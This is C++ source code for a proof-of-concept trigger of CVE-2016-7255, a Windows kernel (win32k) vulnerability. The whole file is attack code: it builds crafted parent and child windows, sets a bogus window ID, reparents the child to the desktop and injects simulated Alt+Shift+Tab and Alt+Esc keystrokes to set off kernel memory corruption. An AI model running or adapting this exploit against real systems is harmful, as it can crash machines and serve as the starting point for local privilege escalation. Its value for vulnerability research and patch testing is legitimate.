#include <iostream>
#include <Windows.h>
using namespace std;

HWND child_hwnd = NULL;
HWND parent_hwnd = NULL;
const char szClassName[] = "CVE-2016-7255";

BOOL Alt_Shift_Tab()
{
	/*
	Syntax
	VOID WINAPI keybd_event(
	   _In_ BYTE      bVk,
	   _In_ BYTE      bScan,
	   _In_ DWORD     dwFlags,
	   _In_ ULONG_PTR dwExtraInfo
	);
	*/

	keybd_event(VK_MENU, 0, 0, 0);
	keybd_event(VK_SHIFT, 0, 0, 0);

	for (int i = 0; i < 4; i++)
	{
		keybd_event(VK_TAB, 0, 0, 0);
		keybd_event(VK_TAB, 0, KEYEVENTF_KEYUP, 0);
		Sleep(1000);
	}

	keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
	keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);

	return TRUE;
}

BOOL Alt_Shift_Esc()
{
	/*
	Syntax
	VOID WINAPI keybd_event(
	   _In_ BYTE      bVk,
	   _In_ BYTE      bScan,
	   _In_ DWORD     dwFlags,
	   _In_ ULONG_PTR dwExtraInfo
	);
	*/

	keybd_event(VK_MENU, 0, 0, 0);
	keybd_event(VK_SHIFT, 0, 0, 0);

	keybd_event(VK_ESCAPE, 0, 0, 0);
	keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);

	keybd_event(VK_ESCAPE, 0, 0, 0);
	keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);

	keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
	keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);

	return TRUE;
}

void SendAltEsc(unsigned int count)
{
	for (unsigned int i = 0; i < count; i++)
	{
		keybd_event(VK_MENU, 0, 0, 0);

		keybd_event(VK_ESCAPE, 0, 0, 0);
		keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);
		keybd_event(VK_ESCAPE, 0, 0, 0);
		keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);

		keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
	}
}

BOOL Poc()
{
	WNDCLASSEXA wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = DefWindowProcA;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = GetModuleHandleA(NULL);
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;
	wc.lpszClassName = szClassName;
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassExA(&wc))
	{
		cout << "[*] Failed to register window.\nError code is %d\n" << GetLastError() << endl;
		system("pause");
		return FALSE;
	}

	// Create Parent window
	parent_hwnd = CreateWindowEx(
		0,
		szClassName,
		0,
		WS_OVERLAPPEDWINDOW | WS_VISIBLE,
		10,
		10,
		100,
		100,
		NULL,
		NULL,
		GetModuleHandle(NULL),
		NULL
	);

	if (!parent_hwnd)
	{
		cout << "\n[*] Failed to create parent window.\nError code is %d\n" << GetLastError() << endl;
		system("pause");
		return FALSE;
	}

	// Create Child window
	child_hwnd = CreateWindowEx(
		0,
		szClassName,
		0,
		WS_OVERLAPPEDWINDOW | WS_VISIBLE | WS_CHILD,
		10,
		10,
		100,
		100,
		parent_hwnd,
		NULL/*hMenu */,
		GetModuleHandle(NULL),
		NULL
	);

	if (!child_hwnd)
	{
		cout << "\n[*] Failed to create child window.\nError code is %d\n" << GetLastError() << endl;
		system("pause");
		return FALSE;
	}

	SetWindowLongPtr(
		child_hwnd,
		GWLP_ID,/*0xfffffff4=GWLP_ID*/
		0x41414141
	);

	ShowWindow(parent_hwnd, SW_SHOWNORMAL);

	SetParent(child_hwnd, GetDesktopWindow());

	SetForegroundWindow(child_hwnd);

	if (!Alt_Shift_Tab())
	{
		cout << "[*] Failed to trigger!" << endl;
		system("pause");
		return FALSE;
	}

	SwitchToThisWindow(child_hwnd, TRUE);

	if (!Alt_Shift_Esc())
	{
		cout << "[*] Failed to trigger!" << endl;
		system("pause");
		return FALSE;
	}

	MSG stMsg;
	int i = 0;

	while (GetMessage(&stMsg, NULL, 0, 0) && i < 20)
	{
		SetFocus(parent_hwnd);
		SendAltEsc(20);
		SetFocus(child_hwnd);
		SendAltEsc(20);
		TranslateMessage(&stMsg);
		DispatchMessage(&stMsg);
		i++;
	}

	return TRUE;
}
int main(int argc, char* argv[])
{
	if (!Poc())
	{
		cout << "[*] Failed to trigger Poc!" << endl;
		system("pause");
		return 1;
	}

	return 0;
}